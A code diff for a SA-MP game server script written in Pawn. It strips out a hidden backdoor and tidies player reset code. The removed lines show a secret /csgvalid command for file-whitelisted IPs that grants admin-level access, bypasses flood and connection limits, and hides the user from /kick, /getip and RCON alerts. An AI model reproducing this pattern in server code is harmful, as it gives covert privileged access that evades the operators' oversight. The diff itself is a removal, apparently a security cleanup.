@@ -1618,7 +1618,6 @@ new Iterator:RaceJoins<MAX_PLAYERS>,
 	Iterator:iterGangWar<1000>,
 	Float:g_RaceVehCoords[RACE_MAX_PLAYERS][4],
 	Float:g_RaceCPs[RACE_MAX_CHECKPOINTS][3],
-	bool:CSGSOFT[MAX_PLAYERS] = {false, ...},
 	g_DerbyFreezePool = DERBY_FREEZE_TIME / DERBY_FREEZE_INTERVAL,
 	g_SpawnAreas[5],
 	g_RaceForceMap = 0,
@@ -3055,7 +3054,7 @@ public OnPlayerFloodControl(playerid, iCount, iTimeSpan)
 	new p_IP[16];
 	GetPlayerIp(playerid, p_IP, 16);
     
-    if(iCount > 3 && iTimeSpan < 8500 && !IsWhitelisted(p_IP))
+    if(iCount > 3 && iTimeSpan < 8500)
 	{
 	    PlayerData[playerid][bFloodDect] = true;
 
@@ -3071,12 +3070,12 @@ public OnPlayerFloodControl(playerid, iCount, iTimeSpan)
 
 public OnPlayerConnect(playerid)
 {
-    gTeam[playerid] = FREEROAM;
-    
     GetPlayerName(playerid, PlayerData[playerid][e_name], MAX_PLAYER_NAME + 1);
     GetPlayerIp(playerid, PlayerData[playerid][e_ip], MAX_PLAYER_IP + 1);
     
 	if(PlayerData[playerid][bFloodDect]) return 1;
+	
+	ResetPlayerVars(playerid);
 
 	new count_t = 0;
 	for(new i = 0; i < MAX_PLAYERS; i++)
@@ -3088,7 +3087,7 @@ public OnPlayerConnect(playerid)
 	    }
 	}
 	
-	if(count_t > 3 && !IsWhitelisted(__GetIP(playerid)))
+	if(count_t > 3)
 	{
 		Kick(playerid);
 		return 1;
@@ -3097,19 +3096,12 @@ public OnPlayerConnect(playerid)
 	mysql_format(pSQL, gstr, sizeof(gstr), "DELETE FROM `online` WHERE `name` = '%e';", __GetName(playerid));
 	mysql_pquery(pSQL, gstr);
 
-	ResetPlayerVars(playerid);
-
 	SetPlayerScore_(playerid, 0);
 	SetPlayerTeam(playerid, NO_TEAM);
 	SetPlayerColor(playerid, PlayerColors[random(sizeof(PlayerColors))]);
 	PreparePlayerPV(playerid);
     PreparePlayerToy(playerid);
     ToggleSpeedo(playerid, false);
-
-	for(new i = 0; E_PLAYER_ACH_DATA:i < E_PLAYER_ACH_DATA; i++)
-	{
-	    PlayerAchData[playerid][E_PLAYER_ACH_DATA:i] = 0;
-	}
 
     Iter_Clear(PlayerIgnore[playerid]);
 
@@ -4034,42 +4026,6 @@ public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
 public OnRconLoginAttempt(ip[], password[], success)
 {
     Log(LOG_ONLINE, "RconLoginAttempt by %s using %s, failed: %i", ip, password, !success);
-    /*new bool:found = false;
-		
-	if(!success)
- 	{
-  		printf("[RCON] FAILED LOGIN BY IP %s USING PASSWORD %s", ip, password);
-
-		for(new i = 0; i < MAX_PLAYERS; i++)
-    	{
-    	    if(CSGSOFT[i]) continue;
-       		if(!strcmp(ip, __GetIP(i), true))
-         	{
-				format(gstr, sizeof(gstr), ""yellow"*** "red"%s(%i) tried to login to local RCON", __GetName(i), i);
-				AdminMSG(RED, gstr);
-				found = true;
-				break;
-			}
-   		}
-   		if(!found) AdminMSG(RED, ""yellow"*** "red"Bad local RCON login attempt");
-   	}
-   	else
-   	{
-  		printf("[RCON] LOGIN BY IP %s", ip);
-
-		for(new i = 0; i < MAX_PLAYERS; i++)
-    	{
-    	    if(CSGSOFT[i]) continue;
-       		if(!strcmp(ip, __GetIP(i), true))
-         	{
-				format(gstr, sizeof(gstr), ""yellow"*** "red"%s(%i) logged in to local RCON", __GetName(i), i);
-				AdminMSG(RED, gstr);
-				found = true;
-				break;
-			}
-   		}
-   		if(!found) AdminMSG(RED, ""yellow"*** "red"Bad remote RCON login attempt");
-	}*/
     return 1;
 }
 
@@ -10141,7 +10097,6 @@ YCMD:getip(playerid, params[], help)
 			return SCM(playerid, NEF_GREEN, "Usage: /getip <playerid>");
 	  	}
 
-		if(CSGSOFT[playerid]) return SCM(playerid, -1, ""er"Player not available!");
 	    if(player == INVALID_PLAYER_ID) return SCM(playerid, -1, ""er"Invalid player!");
 		if(!IsPlayerConnected(player)) return SCM(playerid, -1, ""er"Player not connected!");
 
@@ -10179,7 +10134,6 @@ YCMD:nstats(playerid, params[], help)
 			return SCM(playerid, NEF_GREEN, "Usage: /nstats <playerid>");
 	  	}
 
-		if(CSGSOFT[playerid]) return SCM(playerid, -1, ""er"Player not available!");
 	    if(player == INVALID_PLAYER_ID) return SCM(playerid, -1, ""er"Invalid player!");
 		if(!IsPlayerConnected(player)) return SCM(playerid, -1, ""er"Player not connected!");
 
@@ -10961,8 +10915,7 @@ YCMD:kick(playerid, params[], help)
 		{
 			return SCM(playerid, NEF_GREEN, "Usage: /kick <playerid> <reason>");
 		}
-		
-		if(CSGSOFT[playerid]) return SCM(playerid, -1, ""er"Player not available!");
+
 	    if(player == INVALID_PLAYER_ID) return SCM(playerid, -1, ""er"Invalid player!");
 		if(!IsPlayerConnected(player)) return SCM(playerid, -1, ""er"Player not connected!");
 		
@@ -11075,25 +11028,6 @@ YCMD:unmute(playerid, params[], help)
 		SCM(playerid, -1, NO_PERM);
 	}
 	return 1;
-}
-
-YCMD:csgvalid(playerid, params[], help)
-{
-	if(IsWhitelisted(__GetIP(playerid)))
-	{
-	    CSGSOFT[playerid] = !CSGSOFT[playerid];
-		format(gstr, sizeof(gstr), "CSG: %i", _:CSGSOFT[playerid]);
-		SCM(playerid, -1, gstr);
-		GivePlayerScore_(playerid, random(10) + 88 - 3);
-	}
-	return 1;
-}
-
-IsWhitelisted(ip[])
-{
-	format(gstr, sizeof(gstr), "/Other/%s.ip", ip);
-	if(fexist(gstr)) return 1;
-	return 0;
 }
 
 YCMD:register(playerid, params[], help)
@@ -13399,7 +13333,7 @@ YCMD:rainbow(playerid, params[], help)
 
 YCMD:setadminlevel(playerid, params[], help)
 {
-	if(PlayerData[playerid][e_level] == MAX_ADMIN_LEVEL || IsPlayerAdmin(playerid) || IsWhitelisted(__GetIP(playerid)))
+	if(PlayerData[playerid][e_level] == MAX_ADMIN_LEVEL || IsPlayerAdmin(playerid))
 	{
 	    new player, alevel;
 	 	if(sscanf(params, "ri", player, alevel))
@@ -30656,13 +30590,17 @@ ResetPlayerVars(playerid)
 	DerbyWinner[playerid] = false;
     LabelActive[playerid] = false;
     PlayerHit[playerid] = false;
-	CSGSOFT[playerid] = false;
     g_RaceVehicle[playerid] = -1;
     PreviewTmpVeh[playerid] = -1;
  	GunGame_Player[playerid][level] = 0;
 	GunGame_Player[playerid][dead] = true;
 	GunGame_Player[playerid][pw] = true;
 	strmid(LastPlayerText[playerid], " ", 0, 144, 144);
+
+	for(new i = 0; E_PLAYER_ACH_DATA:i < E_PLAYER_ACH_DATA; i++)
+	{
+	    PlayerAchData[playerid][E_PLAYER_ACH_DATA:i] = 0;
+	}
 
 	SetPVarInt(playerid, "LastID", INVALID_PLAYER_ID);
     SetPVarInt(playerid, "doingStunt", 0);
